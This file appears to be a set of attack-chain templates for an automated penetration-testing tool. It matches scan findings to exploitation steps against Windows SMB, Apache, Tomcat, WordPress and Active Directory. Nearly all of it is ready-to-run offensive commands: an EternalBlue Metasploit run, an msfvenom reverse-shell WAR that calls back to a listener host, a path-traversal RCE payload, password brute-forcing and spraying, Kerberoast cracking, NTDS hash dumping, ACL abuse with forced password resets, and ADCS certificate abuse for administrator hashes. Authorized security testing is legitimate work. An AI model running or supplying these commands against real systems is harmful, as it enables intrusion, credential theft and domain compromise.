_comment: Attack-chain templates. A chain matches when ALL of its 'when' conditions hold against the state (conditions absent are ignored): service_ports (any host has a service on one of these ports), os_contains (any host OS guess contains the string), product_contains (any service product contains it), finding_contains (any finding title contains it). Steps support {TARGET} {LHOST} {LPORT} placeholders.

chains.name: MS17-010 EternalBlue (legacy Windows SMB)
steps: msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {TARGET}; set LHOST {LHOST}; run'

chains.name: Path traversal -> RCE
steps: # CVE-2021-41773/42013: POST /cgi-bin/.%2e/%2e%2e/bin/sh with a command body

chains.name: Tomcat manager WAR deploy
steps: msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o shell.war

chains.name: WordPress enumeration (wpscan)
steps: # then brute found users: wpscan --url http://{TARGET}:{PORT} -U users.txt -P rockyou.txt
# vulnerable plugin RCE is the usual path; check exploit-db for the plugin+version

chains.name: Active Directory - unauthenticated enumeration
steps: nxc smb {TARGET} --users --rid-brute   # enumerate users via RID cycling
ldapsearch -x -H ldap://{TARGET} -s base namingContexts   # anonymous LDAP base

chains.name: Active Directory - authenticated enum + BloodHound
steps: # import the zip into BloodHound and look for shortest paths to Domain Admins

chains.name: Active Directory - Kerberoasting / AS-REP roasting
steps: hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt   # crack TGS (18200 for AS-REP)

chains.name: Active Directory Certificate Services (ADCS) - certipy
steps: # ESC8 (NTLM relay to web enrollment): certipy relay -ca <ca-host>
certipy auth -pfx administrator.pfx -dc-ip {TARGET}   # TGT + NT hash from the cert

chains.name: Active Directory - ACL abuse / DCSync (needs privilege)
steps: # with DCSync rights (Replicating Directory Changes) dump all hashes:
nxc smb {TARGET} -u {USER} -p '{PASS}' --ntds   # if local admin on the DC
# ACL abuse (from BloodHound): bloodyAD --host {TARGET} -d {DOMAIN} -u {USER} -p '{PASS}' add genericAll <target> <you>
# then reset a password / add to a group: bloodyAD ... set password <user> 'NewPass1'

chains.name: Active Directory - password spraying
steps: nxc smb {TARGET} -u users.txt -p 'Season2024!' --continue-on-success   # spray one password

chains.name: Active Directory - ACL abuse (BloodHound edges)
steps: # BloodHound shows an outbound edge from your principal - abuse it with bloodyAD:
# GenericAll / GenericWrite on a USER  -> set a new password or shadow-cred it:
# WriteOwner on a group/user -> take ownership, then grant yourself GenericAll:
# AddMember / AddSelf on a group -> add yourself:
# ForceChangePassword -> reset without knowing the old one (net rpc / bloodyAD set password)

chains.name: Active Directory - Shadow Credentials (msDS-KeyCredentialLink)
steps: # With GenericWrite/GenericAll/WriteOwner over a target, add a Key Credential and auth as them:
# then PKINIT for a TGT + NT hash:
# no clock skew? sync it:  sudo ntpdate {TARGET}   (or faketime)

chains.name: Active Directory - ADCS ESC9/ESC16 (no security extension)
steps: # ESC9 (CT_FLAG_NO_SECURITY_EXTENSION): you need control over the victim account.
# 1) set the victim UPN to the target admin (needs GenericWrite on the victim):
# 2) request the ESC9 template as the victim -> cert with admin UPN:
# 3) restore the victim UPN, then authenticate with the cert:
certipy auth -pfx administrator.pfx -dc-ip {TARGET}   # -> TGT + NT hash
